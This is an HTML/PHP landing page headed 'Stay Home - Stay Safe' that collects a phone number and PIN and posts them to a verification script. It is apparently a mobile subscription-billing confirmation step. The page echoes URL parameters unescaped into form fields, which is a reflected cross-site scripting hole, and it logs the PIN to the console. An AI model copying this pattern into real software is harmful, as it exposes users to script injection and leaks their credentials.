<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <title>Stay Home - Stay Safe</title>
    <link rel="stylesheet" href="./index_files/style.css">
    <link rel="shortcut icon" href="https://get-your-access-now.com/favicon.ico" type="image/x-icon">
    <script src="./index_files/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<script type="text/javascript">
console.log("start ajax");
$(document).ready(function(){    

    $("#submityes").click(function() {
        var msisdn=$('#msisdn').val();
        var cid=$('#cid').val();
        var pin=$('#pin').val();
        console.log(msisdn);
        console.log(cid);
        console.log(pin);
        //return false;
        
            $.ajax({
                type:"POST",
                url:"pin_verify.php",
                data:{msisdn:msisdn,cid:cid,pin:pin},
                success:function(result)
                {
                       $('#newgen').hide();
                       var jsonData = JSON.parse(result);
                                //var jsonData=JSON.stringify(result);
                      //alert(jsonData);
                      //return false;
                    if (jsonData.status == "0")
                    {   
                        location.href = 'thank-you.php?msisdn='+msisdn+'&cid='+cid+'';
                        return false;
                    }
                   else
                    {
                        alert(jsonData.errorMessage);
                        location.reload();

                    }
        
        }
      });
  });
});
</script>
  
  </head>
  <body style="">
        <div class="loader">
      <div class="inner">
        <img src="./index_files/spinner.gif" alt="loading">
        <br>
        <h4>Loading ...</h4>
      </div>
    </div>    <div class="wrapper">
      <div class="container">
        
        <div class="header header-blue">
          <div class="phone">
            <img src="./index_files/mobile.png">
          </div>
        </div>        <div class="content blok1">
          <form  method="GET">
            <p class="orange">Enter your pin</p>
            <div class="phone-control" id="phone-control">
              

                            
                  <input type="hidden" name="cid" id="cid" value="<?php echo $_GET['cid'];?>">
              <input type="hidden" name="msisdn" id="msisdn" value="<?php echo $_GET['msisdn'];?>">
              <input type="text" name="pin" id="pin" class="form-input form-control" placeholder="Enter pin" >
            </div>
                        <!-- <div class="form-submit"> -->
              <button type="button"  class="btn_t btn_sq btn_t-blue btn-door"  name="submit" id="submityes">CONTINUE</button>

              <div id="newgen"></div>
            <!-- </div> -->
          </form>
          <p class="blue">Stay Home - Stay Safe</p>
        </div>
        <div class="mar_auto"><a href="#terms">Terms and Conditions</a>

        </div>
            </div>
    </div>
  
</body></html>